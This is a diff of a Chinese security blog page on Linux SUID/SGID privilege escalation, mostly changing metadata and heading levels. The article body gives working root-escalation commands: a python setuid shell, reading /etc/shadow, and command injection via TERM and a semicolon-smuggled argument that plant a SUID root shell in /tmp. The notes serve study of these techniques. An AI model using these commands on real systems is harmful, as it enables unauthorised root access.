@@ -6,18 +6,21 @@
   <meta name="keywords" content=" linux , 提权 ">
   <meta name="description" content="Linux SUID &amp; SGID | Elin 的空间">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="常用选项 -sn 只判断主机是否在线，不扫描端口 -sV 判断服务软件版本 -O 判断操作系统 -Pn 当主机禁ping后使用，否则会被跳过 -A 强力检测，包含以下：  服务版本识别（-sV）操作系统识别（-O）脚本扫描（-sC）Traceroute（–traceroute） TCP扫描选项 TCP连接扫描（-sT）：指定这个选项后，程序将和目标主机的每个端口都进行完整的三次握手。如果成功建立连">
+<meta name="description" content="linpeas是用shell脚本编写的本地提权检查清单，github 使用命令已收录至cmder">
 <meta property="og:type" content="article">
-<meta property="og:title" content="nmap 使用">
-<meta property="og:url" content="http://example.com/2021/07/26/nmap-%E4%BD%BF%E7%94%A8/index.html">
+<meta property="og:title" content="linpeas 使用">
+<meta property="og:url" content="http://example.com/2021/07/27/linpeas-%E4%BD%BF%E7%94%A8/index.html">
 <meta property="og:site_name" content="Elin 的空间">
-<meta property="og:description" content="常用选项 -sn 只判断主机是否在线，不扫描端口 -sV 判断服务软件版本 -O 判断操作系统 -Pn 当主机禁ping后使用，否则会被跳过 -A 强力检测，包含以下：  服务版本识别（-sV）操作系统识别（-O）脚本扫描（-sC）Traceroute（–traceroute） TCP扫描选项 TCP连接扫描（-sT）：指定这个选项后，程序将和目标主机的每个端口都进行完整的三次握手。如果成功建立连">
+<meta property="og:description" content="linpeas是用shell脚本编写的本地提权检查清单，github 使用命令已收录至cmder">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2021-07-26T09:07:48.000Z">
-<meta property="article:modified_time" content="2021-07-27T02:51:48.118Z">
+<meta property="og:image" content="http://example.com/2021/07/27/linpeas-%E4%BD%BF%E7%94%A8/1.png">
+<meta property="article:published_time" content="2021-07-27T03:20:25.000Z">
+<meta property="article:modified_time" content="2021-07-27T08:10:10.838Z">
 <meta property="article:author" content="Elin">
-<meta property="article:tag" content="tool">
+<meta property="article:tag" content="linux">
+<meta property="article:tag" content="提权">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/07/27/linpeas-%E4%BD%BF%E7%94%A8/1.png">
 
 
 <link rel="icon" href="https://gitee.com/Elinpf/drawing-bed/raw/master/images/elin.png">
@@ -91,7 +94,7 @@
     <li>
         <div class="all active" data-rel="全部文章">全部文章
             
-                <small>(25)</small>
+                <small>(26)</small>
             
         </div>
     </li>
@@ -146,7 +149,7 @@
                         <i class="fold iconfont icon-right"></i>
                         
                         渗透
-                        <small>(8)</small>
+                        <small>(9)</small>
                         
                     </div>
                     
@@ -157,7 +160,7 @@
                                         
                                         知识点
                                         
-                                            <small>(4
+                                            <small>(5
                                                 )</small>
                                         
                                     </div>
@@ -283,7 +286,7 @@
         
     </div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="25">
+<input type="hidden" id="yelog_site_posts_number" value="26">
 
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
@@ -400,6 +403,22 @@
     
     <nav id="title-list-nav">
         
+        <a id="top" class="全部文章 渗透 checklist "
+           href="/2021/07/23/linux-%E6%8F%90%E6%9D%83%E6%B8%85%E5%8D%95/"
+           data-tag="linux,提权"
+           data-author="" >
+            <span class="post-title" title="Linux 提权清单">Linux 提权清单</span>
+            <span class="post-date" title="2021-07-23 08:45:31">2021/07/23</span>
+        </a>
+        
+        <a  class="全部文章 渗透 知识点 "
+           href="/2021/07/27/linpeas-%E4%BD%BF%E7%94%A8/"
+           data-tag="linux,提权"
+           data-author="" >
+            <span class="post-title" title="linpeas 使用">linpeas 使用</span>
+            <span class="post-date" title="2021-07-27 11:20:25">2021/07/27</span>
+        </a>
+        
         <a  class="全部文章 渗透 知识点 "
            href="/2021/07/26/nmap-%E4%BD%BF%E7%94%A8/"
            data-tag="tool"
@@ -422,14 +441,6 @@
            data-author="" >
             <span class="post-title" title="linux 可执行文件的漏洞利用">linux 可执行文件的漏洞利用</span>
             <span class="post-date" title="2021-07-23 09:31:07">2021/07/23</span>
-        </a>
-        
-        <a  class="全部文章 渗透 checklist "
-           href="/2021/07/23/linux-%E6%8F%90%E6%9D%83%E6%B8%85%E5%8D%95/"
-           data-tag="linux,提权"
-           data-author="" >
-            <span class="post-title" title="Linux 提权清单">Linux 提权清单</span>
-            <span class="post-date" title="2021-07-23 08:45:31">2021/07/23</span>
         </a>
         
         <a  class="全部文章 渗透 HTB "
@@ -649,7 +660,7 @@
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2021-07-27 10:51:48'>2021-07-21 17:32</time>
+            发布时间 : <time class="date" title='最后更新: 2021-07-27 16:10:10'>2021-07-21 17:32</time>
         
     </div>
     <div class="article-meta">
@@ -671,7 +682,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SUID"><span class="toc-text">SUID</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SGID"><span class="toc-text">SGID</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rwS"><span class="toc-text">rwS</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E6%96%B9%E6%B3%95"><span class="toc-text">查找方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#7%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-text">7种利用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E7%9A%84%E6%98%AFcsh"><span class="toc-text">用的是csh?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%95%E7%94%A8%E7%9A%84%E6%96%87%E4%BB%B6%E6%B2%A1%E6%9C%89%E4%BD%BF%E7%94%A8%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%EF%BC%9F"><span class="toc-text">引用的文件没有使用绝对路径？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E7%9A%84%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4%E6%98%AF%E5%90%A6%E8%BF%87%E5%A4%A7%EF%BC%9F"><span class="toc-text">脚本的适用范围是否过大？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E4%BA%86%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%EF%BC%9F"><span class="toc-text">使用了临时文件？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E6%98%AF%E5%90%A6%E8%BF%87%E6%BB%A4%EF%BC%8C%E8%83%BD%E5%90%A6%E7%94%A8%E5%88%86%E5%8F%B7%E5%81%9A%E6%9B%B4%E5%A4%9A%E7%9A%84%E4%BA%8B"><span class="toc-text">参数是否过滤，能否用分号做更多的事</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%98%AF%E5%90%A6%E8%AE%BE%E7%BD%AE%E4%BA%86IFS"><span class="toc-text">是否设置了IFS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E6%9C%AC%E8%BA%AB%E7%9A%84%E9%A3%8E%E9%99%A9"><span class="toc-text">脚本本身的风险</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SUID"><span class="toc-text">SUID</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SGID"><span class="toc-text">SGID</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rwS"><span class="toc-text">rwS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E6%96%B9%E6%B3%95"><span class="toc-text">查找方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-text">7种利用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E7%9A%84%E6%98%AFcsh"><span class="toc-text">用的是csh?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%95%E7%94%A8%E7%9A%84%E6%96%87%E4%BB%B6%E6%B2%A1%E6%9C%89%E4%BD%BF%E7%94%A8%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%EF%BC%9F"><span class="toc-text">引用的文件没有使用绝对路径？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E7%9A%84%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4%E6%98%AF%E5%90%A6%E8%BF%87%E5%A4%A7%EF%BC%9F"><span class="toc-text">脚本的适用范围是否过大？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E4%BA%86%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%EF%BC%9F"><span class="toc-text">使用了临时文件？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E6%98%AF%E5%90%A6%E8%BF%87%E6%BB%A4%EF%BC%8C%E8%83%BD%E5%90%A6%E7%94%A8%E5%88%86%E5%8F%B7%E5%81%9A%E6%9B%B4%E5%A4%9A%E7%9A%84%E4%BA%8B"><span class="toc-text">参数是否过滤，能否用分号做更多的事</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%98%AF%E5%90%A6%E8%AE%BE%E7%BD%AE%E4%BA%86IFS"><span class="toc-text">是否设置了IFS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E6%9C%AC%E8%BA%AB%E7%9A%84%E9%A3%8E%E9%99%A9"><span class="toc-text">脚本本身的风险</span></a></li></ol></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -687,8 +698,8 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>SUID 就是 Set User id， SGID 就是 Set Group id</p>
-<h2 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">nathan@<span class="hljs-built_in">cap</span>:~<span class="hljs-comment"># ls -la /usr/bin/passwd</span></span>
+        <h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>SUID 就是 Set User id， SGID 就是 Set Group id</p>
+<h3 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">nathan@<span class="hljs-built_in">cap</span>:~<span class="hljs-comment"># ls -la /usr/bin/passwd</span></span>
 <span class="line">-rwsr-xr-x 1 root root 68208 May 28  2020 /usr/bin/passwd</span>
 </code></pre></div></div>
 
@@ -704,7 +715,7 @@
 <span class="line">chmod u+s /usr/bin/cat</span>
 </code></pre></div></div>
 
-<h2 id="SGID"><a href="#SGID" class="headerlink" title="SGID"></a>SGID</h2><p>对于可执行文件特点与SUID一样，只不过是已组的权限运行的。</p>
+<h3 id="SGID"><a href="#SGID" class="headerlink" title="SGID"></a>SGID</h3><p>对于可执行文件特点与SUID一样，只不过是已组的权限运行的。</p>
 <p>对于文件夹来说，如果这个文件夹的所有组被标记了<code>s</code>，特点如下：</p>
 <ol>
 <li>对这个文件夹拥有<code>r</code>和<code>x</code>的用户，可以进入文件夹</li>
@@ -715,19 +726,19 @@
 <span class="line">chmod g+s file_dir</span>
 </code></pre></div></div>
 
-<h2 id="rwS"><a href="#rwS" class="headerlink" title="rwS"></a>rwS</h2><p>有的文件是<code>S</code>为标记，说明没有执行权限。因为与<code>x</code>重合了所有做了区分</p>
-<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>suid 的利用方式常常是因为配置的可执行文件能够得到<code>shell</code>或者可以访问敏感信息。</p>
+<h3 id="rwS"><a href="#rwS" class="headerlink" title="rwS"></a>rwS</h3><p>有的文件是<code>S</code>为标记，说明没有执行权限。因为与<code>x</code>重合了所有做了区分</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>suid 的利用方式常常是因为配置的可执行文件能够得到<code>shell</code>或者可以访问敏感信息。</p>
 <p>例如，如果<code>cat</code>有了suid的权限，那么就可以访问<code>cat /etc/shadow</code>。</p>
 <p>或者<code>python</code>有了suid，那么就可以以root权限执行<code>/bin/bash</code>从而得到root的shell</p>
 <div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">python -c <span class="hljs-string">&#x27;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#x27;</span></span>
 </code></pre></div></div>
 
-<h2 id="查找方法"><a href="#查找方法" class="headerlink" title="查找方法"></a>查找方法</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">find / -perm -4000 2&gt;/dev/null  <span class="hljs-comment"># 查看所有suid的二进制文件</span></span>
+<h3 id="查找方法"><a href="#查找方法" class="headerlink" title="查找方法"></a>查找方法</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">find / -perm -4000 2&gt;/dev/null  <span class="hljs-comment"># 查看所有suid的二进制文件</span></span>
 <span class="line">find / -perm -2000 2&gt;/dev/null  <span class="hljs-comment"># 查看所有sgid的二进制文件和文件夹</span></span>
 </code></pre></div></div>
 
-<h1 id="7种利用方法"><a href="#7种利用方法" class="headerlink" title="7种利用方法"></a>7种利用方法</h1><p>方法参考了<a target="_blank" rel="noopener" href="http://repository.root-me.org/Administration/Unix/EN%20-%20Dangers%20of%20SUID%20Shell%20Scripts.pdf">这篇文章</a></p>
-<h2 id="用的是csh"><a href="#用的是csh" class="headerlink" title="用的是csh?"></a>用的是csh?</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">% ls change-pass</span>
+<h3 id="7种利用方法"><a href="#7种利用方法" class="headerlink" title="7种利用方法"></a>7种利用方法</h3><p>方法参考了<a target="_blank" rel="noopener" href="http://repository.root-me.org/Administration/Unix/EN%20-%20Dangers%20of%20SUID%20Shell%20Scripts.pdf">这篇文章</a></p>
+<h4 id="用的是csh"><a href="#用的是csh" class="headerlink" title="用的是csh?"></a>用的是csh?</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">% ls change-pass</span>
 <span class="line">-rwsr-x--- 1 root helpdesk</span>
 <span class="line"> 37 Feb 26 16:35 change-pass</span>
 <span class="line">% cat change-pass</span>
@@ -739,7 +750,7 @@
 <div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">% env TERM=<span class="hljs-string">&#x27;`cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755/tmp/sh`&#x27;</span> change-pass</span>
 </code></pre></div></div>
 
-<h2 id="引用的文件没有使用绝对路径？"><a href="#引用的文件没有使用绝对路径？" class="headerlink" title="引用的文件没有使用绝对路径？"></a>引用的文件没有使用绝对路径？</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">% cat change-pass</span>
+<h4 id="引用的文件没有使用绝对路径？"><a href="#引用的文件没有使用绝对路径？" class="headerlink" title="引用的文件没有使用绝对路径？"></a>引用的文件没有使用绝对路径？</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">% cat change-pass</span>
 <span class="line"><span class="hljs-comment">#!/bin/ksh</span></span>
 <span class="line">user=<span class="hljs-variable">$1</span></span>
 <span class="line">passwd <span class="hljs-variable">$user</span></span>
@@ -750,7 +761,7 @@
 <span class="line">% ./change-pass</span>
 </code></pre></div></div>
 
-<h2 id="脚本的适用范围是否过大？"><a href="#脚本的适用范围是否过大？" class="headerlink" title="脚本的适用范围是否过大？"></a>脚本的适用范围是否过大？</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">% cat change-pass</span>
+<h4 id="脚本的适用范围是否过大？"><a href="#脚本的适用范围是否过大？" class="headerlink" title="脚本的适用范围是否过大？"></a>脚本的适用范围是否过大？</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">% cat change-pass</span>
 <span class="line"><span class="hljs-comment">#!/bin/ksh</span></span>
 <span class="line">PATH=<span class="hljs-string">&#x27;/bin:/usr/bin&#x27;</span></span>
 <span class="line">user=<span class="hljs-variable">$1</span></span>
@@ -758,7 +769,7 @@
 </code></pre></div></div>
 
 <p>可以修改root的密码</p>
-<h2 id="使用了临时文件？"><a href="#使用了临时文件？" class="headerlink" title="使用了临时文件？"></a>使用了临时文件？</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">% cat change-pass</span>
+<h4 id="使用了临时文件？"><a href="#使用了临时文件？" class="headerlink" title="使用了临时文件？"></a>使用了临时文件？</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">% cat change-pass</span>
 <span class="line"><span class="hljs-comment">#!/bin/ksh</span></span>
 <span class="line">PATH=<span class="hljs-string">&#x27;/bin:/usr/bin&#x27;</span></span>
 <span class="line">user=<span class="hljs-variable">$1</span></span>
@@ -771,7 +782,7 @@
 </code></pre></div></div>
 
 <p>看到上面使用了临时文件，那么就意味着可以打时间差，通过疯狂循，用空覆盖掉写入的内容。<br>那么就跳过了检查是否为空，就可以修改root密码了。</p>
-<h2 id="参数是否过滤，能否用分号做更多的事"><a href="#参数是否过滤，能否用分号做更多的事" class="headerlink" title="参数是否过滤，能否用分号做更多的事"></a>参数是否过滤，能否用分号做更多的事</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">% cat change-pass</span>
+<h4 id="参数是否过滤，能否用分号做更多的事"><a href="#参数是否过滤，能否用分号做更多的事" class="headerlink" title="参数是否过滤，能否用分号做更多的事"></a>参数是否过滤，能否用分号做更多的事</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">% cat change-pass</span>
 <span class="line"><span class="hljs-comment">#!/bin/ksh</span></span>
 <span class="line">PATH=<span class="hljs-string">&#x27;/bin:/usr/bin&#x27;</span></span>
 <span class="line">user=<span class="hljs-variable">$1</span></span>
@@ -784,13 +795,13 @@
 <div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">change-pass <span class="hljs-string">&quot;user;cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755 /tmp/sh&quot;</span></span>
 </code></pre></div></div>
 
-<h2 id="是否设置了IFS"><a href="#是否设置了IFS" class="headerlink" title="是否设置了IFS"></a>是否设置了IFS</h2><p><strong>IFS(Internal Field Separator)</strong>, 内部域分割符，set环境变量。</p>
+<h4 id="是否设置了IFS"><a href="#是否设置了IFS" class="headerlink" title="是否设置了IFS"></a>是否设置了IFS</h4><p><strong>IFS(Internal Field Separator)</strong>, 内部域分割符，set环境变量。</p>
 <p>案例中给出了使用方法</p>
 <div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">export IFS=&#x27;/&#x27;</span>
 </code></pre></div></div>
 
 <p>这样<code>/usr/bin/passwd</code> 就变成了 <code>usr bin passwd</code>，然后替换<code>usr</code>的执行就可以了，但是没有实验成功。</p>
-<h2 id="脚本本身的风险"><a href="#脚本本身的风险" class="headerlink" title="脚本本身的风险"></a>脚本本身的风险</h2><p>脚本要运行会有两个步骤：</p>
+<h4 id="脚本本身的风险"><a href="#脚本本身的风险" class="headerlink" title="脚本本身的风险"></a>脚本本身的风险</h4><p>脚本要运行会有两个步骤：</p>
 <ol>
 <li>启动一个shell</li>
 <li>这个shell读取脚本的内容然后执行</li>
